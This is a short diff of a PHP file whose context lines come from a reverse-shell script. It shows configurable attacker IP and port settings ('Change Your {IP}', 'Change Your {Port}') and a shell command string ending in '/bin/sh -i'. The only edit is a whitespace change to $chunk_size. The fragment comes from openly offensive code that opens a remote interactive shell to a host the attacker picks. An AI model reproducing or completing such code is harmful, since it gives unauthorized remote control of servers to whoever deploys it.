@@ -6,7 +6,7 @@ set_time_limit (0);
 $VERSION 	= "1.0";
 $ip 		= '127.0.0.1'; 	// Change Your {IP}
 $port 		= 1234;       	// Change Your {Port}
-$chunk_size = 1400;
+$chunk_size 	= 1400;
 $write_a 	= null;
 $error_a 	= null;
 $shell 		= 'uname -a; w; id; /bin/sh -i';
